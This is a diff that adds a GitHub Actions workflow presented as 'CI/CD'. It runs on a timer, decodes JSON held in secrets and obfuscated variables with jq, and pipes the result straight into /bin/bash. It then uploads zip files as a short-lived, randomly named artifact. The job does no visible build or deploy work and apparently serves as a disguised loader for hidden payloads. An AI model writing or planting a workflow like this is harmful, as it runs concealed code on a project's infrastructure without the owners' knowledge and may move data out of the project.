@@ -1,0 +1,34 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '9 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          zp29209: ${{ secrets.zp29209 }}
+        run: |
+          printf '%s' "$zp29209" | jq -r .reyi717 | /bin/bash
+          printf '%s' "$znj795" | jq -r .z377 | /bin/bash
+          printf '%s' "$glth2" | jq -r .egib4947 | /bin/bash
+          printf '%s' "$xigko3" | jq -r .k0 | /bin/bash
+          printf '%s' "$rvhes2844" | jq -r .lawe1 | /bin/bash
+          echo $wcp29800 | jq -r .ixssa6168 | /bin/bash
+          echo $w2 | jq -r .oyfj196 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: fZAoYEZF
+          path: "*.zip"
+          retention-days: 1
